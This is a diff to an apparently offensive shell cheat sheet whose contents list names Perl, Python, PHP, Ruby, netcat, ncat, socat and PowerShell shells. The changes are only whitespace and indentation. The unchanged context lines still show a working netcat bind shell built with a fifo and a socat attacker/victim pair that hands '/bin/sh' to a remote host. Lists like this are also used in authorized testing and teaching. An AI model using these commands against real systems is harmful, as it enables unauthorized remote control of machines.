@@ -3,16 +3,15 @@
 ## Summary
 
 * [Reverse Shell](#reverse-shell)
-    * [Perl](#perl)
-    * [Python](#python)
-    * [PHP](#php)
-    * [Ruby](#ruby)
-    * [Netcat Traditional](#netcat-traditional)
-    * [Netcat OpenBsd](#netcat-openbsd)
-    * [Ncat](#ncat)
-    * [Socat](#socat)
-    * [Powershell](#powershell)
-
+  * [Perl](#perl)
+  * [Python](#python)
+  * [PHP](#php)
+  * [Ruby](#ruby)
+  * [Netcat Traditional](#netcat-traditional)
+  * [Netcat OpenBsd](#netcat-openbsd)
+  * [Ncat](#ncat)
+  * [Socat](#socat)
+  * [Powershell](#powershell)
 
 ## Perl
 
@@ -52,7 +51,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f
 ## Socat
 
 ```powershell
-user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 
+user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345
 user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
 ```
 
